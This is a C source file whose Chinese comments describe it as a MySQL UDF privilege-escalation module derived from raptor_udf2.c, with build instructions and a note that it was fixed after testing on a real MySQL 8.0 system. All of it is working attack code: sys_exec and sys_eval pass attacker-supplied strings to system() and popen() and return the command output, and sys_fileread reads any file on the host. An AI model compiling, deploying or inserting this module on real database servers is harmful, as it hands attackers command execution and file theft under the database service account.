// udf_exec.c - MySQL UDF 提权模块 (精简自 raptor_udf2.c 思路)
// 编译: gcc -shared -fPIC -I/usr/include/mysql udf_exec.c -o udf_exec.so
#include <mysql.h>
#include <stdbool.h>
/* MySQL 8.0 头文件已移除 my_bool, 用 bool 替代 (实机验证修复) */
#ifndef my_bool
#define my_bool bool
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---------------- sys_exec (返回命令退出码) ---------------- */
my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() requires one string argument");
        return 1;
    }
    return 0;
}
void sys_exec_deinit(UDF_INIT *initid) {}
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->args[0] == NULL) { *is_null = 1; return 0; }
    return (long long)system(args->args[0]);
}

/* ---------------- sys_eval (带命令输出回显) ---------------- */
my_bool sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_eval() requires one string argument");
        return 1;
    }
    return 0;
}
void sys_eval_deinit(UDF_INIT *initid) {}
char *sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result,
               unsigned long *length, char *is_null, char *error) {
    if (args->args[0] == NULL) { *is_null = 1; return NULL; }
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "%s 2>&1", args->args[0]);
    FILE *fp = popen(cmd, "r");
    if (!fp) { *is_null = 1; return NULL; }
    static char out[4096];
    size_t n = fread(out, 1, sizeof(out) - 1, fp);
    pclose(fp);
    out[n] = '\0';
    *length = n;
    return out;
}

/* ---------------- sys_fileread (读任意文件) ---------------- */
my_bool sys_fileread_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_fileread() requires one string argument");
        return 1;
    }
    return 0;
}
void sys_fileread_deinit(UDF_INIT *initid) {}
char *sys_fileread(UDF_INIT *initid, UDF_ARGS *args, char *result,
                   unsigned long *length, char *is_null, char *error) {
    if (args->args[0] == NULL) { *is_null = 1; return NULL; }
    FILE *fp = fopen(args->args[0], "rb");
    if (!fp) { *is_null = 1; return NULL; }
    static char buf[4096];
    size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    buf[n] = '\0';
    *length = n;
    return buf;
}
